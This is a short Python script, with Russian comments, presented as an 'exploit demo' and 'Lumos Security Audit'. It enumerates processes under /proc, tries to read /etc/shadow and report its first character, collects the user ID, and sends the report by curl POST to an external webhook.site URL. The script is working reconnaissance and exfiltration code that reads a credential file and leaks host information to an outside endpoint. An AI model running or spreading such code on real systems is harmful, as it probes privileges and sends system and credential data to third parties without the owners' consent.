import os
import subprocess

WEBHOOK_URL = "https://webhook.site/6d6434ac-bcd7-48a4-901c-53ca63be0ec2"

def exploit_demo():
    # Попытка увидеть все процессы в системе (обычно ограничено в контейнерах)
    pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]
    
    # Попытка прочитать shadow (только для root)
    shadow_access = "FAILED"
    try:
        with open('/etc/shadow', 'r') as f:
            line = f.readline()
            shadow_access = "SUCCESS (First char: " + line[0] + ")"
    except:
        pass

    report = (
        "--- [Lumos Security Audit] ---\n"
        f"Visible PIDs: {len(pids)}\n"
        f"Root Access Check (/etc/shadow): {shadow_access}\n"
        f"UID: {os.getuid()}\n"
    )
    
    subprocess.run(['curl', '-s', '-X', 'POST', '--data-urlencode', f"payload={report}", WEBHOOK_URL])

if __name__ == "__main__":
    exploit_demo()
